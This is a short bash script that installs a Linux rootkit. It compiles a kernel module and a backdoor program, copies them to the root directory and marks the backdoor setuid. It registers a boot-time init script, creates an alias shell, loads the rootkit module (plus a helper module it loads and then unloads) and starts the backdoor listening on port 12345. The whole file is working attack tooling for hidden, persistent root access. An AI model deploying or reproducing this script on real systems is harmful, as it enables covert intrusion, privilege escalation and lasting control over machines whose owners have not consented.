#!/bin/bash
# ./my_rootkit.sh

#CUR_DIR=$(shell pwd)
#make
make
gcc backdoor.c -o backdoor

cp my_rootkit.ko remove_module.ko backdoor /
chmod u+s /backdoor

chmod 755 my_rootkit_init.sh
cp my_rootkit_init.sh /etc/init.d/

ln -s /etc/init.d/my_rootkit_init.sh /etc/rc2.d/S75my_rootkit
ln -s /bin/sh /bin/my_rootkit_sh

insmod /my_rootkit.ko
insmod /remove_module.ko
rmmod /remove_module

/backdoor 12345
#rm -r -f CUR_DIR


